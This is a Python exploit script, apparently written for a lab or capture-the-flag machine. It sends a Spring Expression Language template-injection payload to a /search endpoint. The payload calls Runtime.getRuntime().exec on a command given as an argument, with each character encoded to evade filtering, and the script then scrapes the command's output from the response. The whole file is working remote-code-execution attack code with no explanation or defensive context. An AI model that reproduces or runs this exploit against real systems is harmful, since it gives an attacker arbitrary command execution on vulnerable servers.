#!/usr/bin/env python
import sys
import requests
from bs4 import BeautifulSoup

url = "http://10.10.11.170:8080/search"
payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character)"
proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

command = sys.argv[1]
ascii_values = []

for c in command:
	ascii_values.append(ord(c))

for value in ascii_values:
	if value == ascii_values[0]:
		payload += f".toString({value})"
	else:
		payload += f".concat(T(java.lang.Character).toString({value})))"

payload += ".getInputStream())}"

headers = {'Content-Type': 'application/x-www-form-urlencoded'}
post_data = {'name':payload}
post_data = "&".join("%s=%s" % (k,v) for k,v in post_data.items())

r = requests.post(url,proxies=proxy,data=post_data,headers=headers)

soup = BeautifulSoup(r.text, 'html.parser')
out = soup.body.h2.contents[0]
out = out.replace('You searched for:','').strip()

print(out)


